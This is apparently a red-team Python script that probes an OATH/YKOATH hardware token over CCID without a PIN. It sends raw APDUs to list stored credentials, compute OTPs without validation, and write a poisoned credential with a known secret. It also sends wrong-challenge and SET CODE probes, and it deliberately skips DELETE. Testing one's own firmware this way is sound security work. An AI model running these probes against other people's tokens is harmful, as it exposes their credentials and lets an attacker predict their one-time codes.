"""OATH/YKOATH attack battery over CCID.

Tests the three attack classes that need no PIN knowledge:
  1. enumeration (LIST) — what credentials does the device hold?
  2. validation bypass — does CALC answer on a locked device?
  3. seed poisoning — can PUT overwrite/add a credential without VALIDATE,
     letting an attacker predict future OTPs?
"""
import sys, time
sys.path.insert(0, "/home/eddieoz/Projects/git/pico/fapico2/redteam")
from ccid import Card, toBytes

c = Card()
r, sw = c.select("A0000005272101")
print("SELECT OATH SW=%04X len=%d" % (sw, len(r)))
print("  select data: %s" % r.hex())

# --- 1. LIST (INS 0x02) — credential names, no auth ---------------------
r, sw = c.apdu(0x00, 0x02, data=b"\x00")
print("\nLIST SW=%04X len=%d" % (sw, len(r)))
if r:
    # TLV: 0x71 name(len) name, 0x73 algo, 0x74 touch
    i = 0
    while i < len(r):
        tag = r[i]; i += 1
        ln = r[i]; i += 1
        val = r[i:i + ln]; i += ln
        print("  tag %02X len %d: %s" % (tag, ln, val.hex() if tag != 0x71 else val.decode(errors="replace")))

# --- 2. CALC (INS 0xA2) without VALIDATE — the OTP oracle ---------------
for name in (b"redteam:probe", b"default"):
    apdu_name = name.split(b":")
    # YKOATH CALC name is name:algo  (default algo 6 = HOTP if omitted)
    resp_name = name + b":\x06" if b":" not in name else name
    body = bytes([len(resp_name)]) + resp_name
    r, sw = c.apdu(0x00, 0xA2, data=body)
    print("CALC %-16s SW=%04X len=%d %s" % (name.decode(errors="replace"), sw, len(r), r.hex()[:40]))
    if sw == 0x9000 and r:
        trunc = r[-1]
        print("    -> OTP value: %s (truncated=%d)" % (r[:-1].hex(), trunc))

# --- 3. Seed poisoning: PUT without VALIDATE ----------------------------
# YKOATH PUT: name + algo + secret(20 bytes, 0-padded to 20) + [challenge:6][response:4]
KNOWN_SEED = bytes.fromhex("3132333435363738393031323334353637383930" + "00" * 10)
name = b"redteam:poison"
secret_field = bytes([20]) + b"secret\x00" + bytes(20 - 7)   # 20-byte padded secret
put_body = bytes([len(name)]) + name + b"\x06" + secret_field
r, sw = c.apdu(0x00, 0x01, data=put_body)
print("\nPUT without VALIDATE SW=%04X len=%d %s" % (sw, len(r), r.hex()[:40]))

# if it landed, enumerate again to see whether it now exists
r, sw = c.apdu(0x00, 0x02, data=b"\x00")
print("LIST after poison SW=%04X" % sw)
print("  %s" % r.hex())

# --- 4. DELETE (INS 0x04) without VALIDATE — destructive, listing only --
# we do NOT send DELETE: it would destroy the owner's credentials.
print("\n(DELETE intentionally not sent — it is the owner's data)")

# --- 5. VALIDATE with a wrong challenge (INS 0xA4) ----------------------
r, sw = c.apdu(0x00, 0xA4, data=bytes([8]) + b"\x01" * 8)
print("VALIDATE wrong challenge SW=%04X (6982 = refused, expected)" % sw)

# --- 6. SET CODE / reset-code probes ------------------------------------
r, sw = c.apdu(0x00, 0x03, data=b"\x00")   # SET CODE / reset
print("SET CODE probe SW=%04X" % sw)

c.disconnect()